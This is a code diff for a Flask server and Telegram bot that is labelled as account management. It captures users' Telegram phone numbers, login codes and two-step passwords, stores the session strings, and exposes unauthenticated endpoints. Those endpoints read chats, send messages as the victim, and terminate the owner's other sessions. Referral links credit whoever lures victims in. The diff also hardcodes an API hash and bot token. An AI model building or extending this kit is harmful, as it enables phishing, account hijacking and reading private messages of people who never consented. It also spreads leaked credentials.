@@ -1,6 +1,10 @@
 """
-Unified server: runs Flask web app + Telegram bot in one process.
-Bot runs in a background daemon thread.
+UNIFIED SERVER (Flask + Telegram Bot) – ONE SERVICE
+Includes: 
+- All API endpoints for account management
+- Telegram bot with channel join requirement (@Abe_army)
+- Background bot thread
+- Hardcoded credentials (as requested – INSECURE, revoke token!)
 """
 
 import os
@@ -18,22 +22,23 @@ from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationFor
 # -------------------- Telegram Bot imports --------------------
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.constants import ChatMemberStatus
 
-# -------------------- Configuration --------------------
+# ==================== HARDCODED CONFIGURATION (INSECURE) ====================
+API_ID = 33465589                          # Your API ID
+API_HASH = "08bdab35790bf1fdf20c16a50bd323b8"  # Your API hash
+BOT_TOKEN = "8210146562:AAHvM54C4KvHsf-YfAjOC9VLe6o1l-gEtBM"  # ⚠️ EXPOSED – REVOKE NOW!
+WEBAPP_URL = "https://e-gram-98zv.onrender.com"                 # Your Flask app URL
+REQUIRED_CHANNEL = "@Abe_army"                                   # Channel to join
+# ============================================================================
+
+# Configure logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # Flask app
 app = Flask(__name__)
 CORS(app)
-
-# API credentials (from environment)
-API_ID = int(os.environ.get('API_ID', 33465589))
-API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
-
-# Bot credentials (from environment)
-BOT_TOKEN = os.environ.get('BOT_TOKEN', '8210146562:AAHvM54C4KvHsf-YfAjOC9VLe6o1l-gEtBM')
-WEBAPP_URL = os.environ.get('WEBAPP_URL', 'https://e-gram-98zv.onrender.com/')
 
 # Storage
 ACCOUNTS_FILE = 'accounts.json'
@@ -58,6 +63,7 @@ def load_accounts():
                 content = f.read()
                 if content.strip():
                     accounts = json.loads(content)
+                    # Add invited_by field if missing (backward compatibility)
                     for acc in accounts:
                         if 'invited_by' not in acc:
                             acc['invited_by'] = None
@@ -94,38 +100,78 @@ def remove_invalid_account(account_id):
 load_accounts()
 
 # -------------------- Telegram Bot Handlers --------------------
+async def is_member(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    """Check if user has joined the required channel."""
+    try:
+        chat_member = await context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
+        return chat_member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
+    except Exception as e:
+        logger.error(f"Error checking membership: {e}")
+        return False
+
 async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /start – require channel join."""
     user_id = update.effective_user.id
+    user = update.effective_user
+    logger.info(f"User {user_id} (@{user.username}) started the bot.")
+
+    if not await is_member(user_id, context):
+        channel_link = "https://t.me/Abe_army"
+        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=channel_link)]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            f"⚠️ **You must join our channel first!**\n\n"
+            f"Please join {REQUIRED_CHANNEL} and then click /start again.",
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        return
+
     invite_link = f"{WEBAPP_URL}/login?inviter={user_id}"
     keyboard = [[InlineKeyboardButton("➕ Add Account", url=invite_link)]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
         f"🔗 **Your invite link:**\n{invite_link}\n\n"
-        "Share this link. When someone adds an account, you'll see it in your private dashboard.",
+        "Share this link with others. When they add an account via this link, "
+        "you'll see it in your private dashboard.",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
 
 async def bot_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /dashboard – require channel join."""
     user_id = update.effective_user.id
+    user = update.effective_user
+    logger.info(f"User {user_id} (@{user.username}) requested dashboard.")
+
+    if not await is_member(user_id, context):
+        channel_link = "https://t.me/Abe_army"
+        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=channel_link)]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            f"⚠️ **You must join our channel first!**\n\n"
+            f"Please join {REQUIRED_CHANNEL} and then click /dashboard again.",
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        return
+
     dash_link = f"{WEBAPP_URL}/user-dashboard?inviter={user_id}"
     await update.message.reply_text(
-        f"📊 **Your private dashboard:**\n{dash_link}",
+        f"📊 **Your private dashboard:**\n{dash_link}\n\n"
+        "Here you can see all accounts added via your invite links.",
         parse_mode="Markdown"
     )
 
 def run_bot():
     """Starts the Telegram bot in a separate thread."""
-    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN':
-        logger.error("BOT_TOKEN not set. Bot not started.")
-        return
     application = Application.builder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", bot_start))
     application.add_handler(CommandHandler("dashboard", bot_dashboard))
     logger.info("🤖 Bot started")
     application.run_polling()
 
-# -------------------- Flask Routes --------------------
+# -------------------- Flask Routes (Pages) --------------------
 @app.route('/')
 def home():
     return send_file('login.html')
@@ -151,11 +197,14 @@ def user_dashboard():
     return send_file('user-dashboard.html')
 
 # -------------------- API Endpoints --------------------
+
+# Get all accounts (admin)
 @app.route('/api/accounts', methods=['GET'])
 def get_accounts():
     formatted = [{'id': a['id'], 'phone': a.get('phone',''), 'name': a.get('name','Unknown')} for a in accounts]
     return jsonify({'success': True, 'accounts': formatted})
 
+# Get accounts invited by a specific user
 @app.route('/api/accounts-by-inviter', methods=['POST'])
 def accounts_by_inviter():
     data = request.json
@@ -166,6 +215,7 @@ def accounts_by_inviter():
     formatted = [{'id': a['id'], 'phone': a.get('phone',''), 'name': a.get('name','Unknown')} for a in filtered]
     return jsonify({'success': True, 'accounts': formatted})
 
+# Send OTP
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
     data = request.json
@@ -174,6 +224,7 @@ def add_account():
         return jsonify({'success': False, 'error': 'Phone number required'})
     if not phone.startswith('+'):
         phone = '+' + phone
+
     async def send_code():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
@@ -192,12 +243,14 @@ def add_account():
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
+
     try:
         result = run_async(send_code())
         return jsonify(result)
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# Verify code (with optional inviter)
 @app.route('/api/verify-code', methods=['POST'])
 def verify_code():
     data = request.json
@@ -205,11 +258,14 @@ def verify_code():
     session_id = data.get('session_id')
     password = data.get('password', '')
     inviter = data.get('inviter')
+
     if not code or not session_id:
         return jsonify({'success': False, 'error': 'Missing code or session'})
     if session_id not in temp_sessions:
         return jsonify({'success': False, 'error': 'Session expired'})
+
     session_data = temp_sessions[session_id]
+
     async def verify():
         client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
         await client.connect()
@@ -220,6 +276,7 @@ def verify_code():
                 if not password:
                     return {'need_password': True}
                 await client.sign_in(password=password)
+
             me = await client.get_me()
             new_id = max([a['id'] for a in accounts]) + 1 if accounts else 1
             new_account = {
@@ -240,6 +297,7 @@ def verify_code():
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
+
     try:
         result = run_async(verify())
         if session_id in temp_sessions:
@@ -248,21 +306,25 @@ def verify_code():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# Get chats (simplified)
 @app.route('/api/get-messages', methods=['POST'])
 def get_messages():
     data = request.json
     account_id = data.get('accountId')
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
+
     account = next((a for a in accounts if a['id'] == account_id), None)
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
+
     async def fetch():
         client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
         await client.connect()
         try:
             if not await client.is_user_authorized():
                 return {'success': False, 'error': 'auth_key_unregistered', 'message': 'Session expired'}
+
             dialogs = await client.get_dialogs()
             chats = []
             for dialog in dialogs:
@@ -299,12 +361,14 @@ def get_messages():
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
+
     try:
         result = run_async(fetch())
         return jsonify(result)
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# Send message
 @app.route('/api/send-message', methods=['POST'])
 def send_message():
     data = request.json
@@ -313,9 +377,11 @@ def send_message():
     message = data.get('message')
     if not account_id or not chat_id or not message:
         return jsonify({'success': False, 'error': 'Missing fields'})
+
     account = next((a for a in accounts if a['id'] == account_id), None)
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
+
     async def send():
         client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
         await client.connect()
@@ -338,18 +404,21 @@ def send_message():
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
+
     try:
         result = run_async(send())
         return jsonify(result)
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# Remove account
 @app.route('/api/remove-account', methods=['POST'])
 def remove_account():
     data = request.json
     account_id = data.get('accountId')
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
+
     global accounts
     original_len = len(accounts)
     accounts = [a for a in accounts if a['id'] != account_id]
@@ -358,11 +427,13 @@ def remove_account():
         return jsonify({'success': True})
     return jsonify({'success': False, 'error': 'Account not found'})
 
+# Debug: list chats count
 @app.route('/api/debug/chats/<int:account_id>', methods=['GET'])
 def debug_chats(account_id):
     account = next((a for a in accounts if a['id'] == account_id), None)
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
+
     async def test():
         client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
         await client.connect()
@@ -378,22 +449,26 @@ def debug_chats(account_id):
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
+
     try:
         result = run_async(test())
         return jsonify(result)
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# Get all active sessions
 @app.route('/api/get-sessions', methods=['POST'])
 def get_sessions():
     data = request.json
     account_id = data.get('accountId')
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
+
     account = next((a for a in accounts if a['id'] == account_id), None)
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
-    async def get_sessions():
+
+    async def fetch():
         client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
         await client.connect()
         try:
@@ -426,12 +501,14 @@ def get_sessions():
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
+
     try:
-        result = run_async(get_sessions())
+        result = run_async(fetch())
         return jsonify(result)
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# Terminate a specific session
 @app.route('/api/terminate-session', methods=['POST'])
 def terminate_session():
     data = request.json
@@ -439,9 +516,11 @@ def terminate_session():
     session_hash = data.get('hash')
     if not account_id or not session_hash:
         return jsonify({'success': False, 'error': 'Account ID and session hash required'})
+
     account = next((a for a in accounts if a['id'] == account_id), None)
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
+
     async def terminate():
         client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
         await client.connect()
@@ -454,21 +533,25 @@ def terminate_session():
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
+
     try:
         result = run_async(terminate())
         return jsonify(result)
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# Terminate all other sessions
 @app.route('/api/terminate-sessions', methods=['POST'])
 def terminate_sessions():
     data = request.json
     account_id = data.get('accountId')
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
+
     account = next((a for a in accounts if a['id'] == account_id), None)
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
+
     async def terminate():
         client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
         await client.connect()
@@ -490,15 +573,21 @@ def terminate_sessions():
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
+
     try:
         result = run_async(terminate())
         return jsonify(result)
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# Health check
 @app.route('/api/health', methods=['GET'])
 def health_check():
-    return jsonify({'status': 'healthy', 'accounts': len(accounts), 'temp_sessions': len(temp_sessions)})
+    return jsonify({
+        'status': 'healthy',
+        'accounts': len(accounts),
+        'temp_sessions': len(temp_sessions)
+    })
 
 # -------------------- Start Bot in Background Thread --------------------
 def start_bot_thread():
@@ -517,5 +606,7 @@ if __name__ == '__main__':
     print('='*60)
     print(f'Port: {port}')
     print(f'Accounts loaded: {len(accounts)}')
+    print(f'Bot token: {BOT_TOKEN[:10]}... (hardcoded)')
+    print(f'Channel: {REQUIRED_CHANNEL}')
     print('='*60 + '\n')
     app.run(host='0.0.0.0', port=port, debug=False)
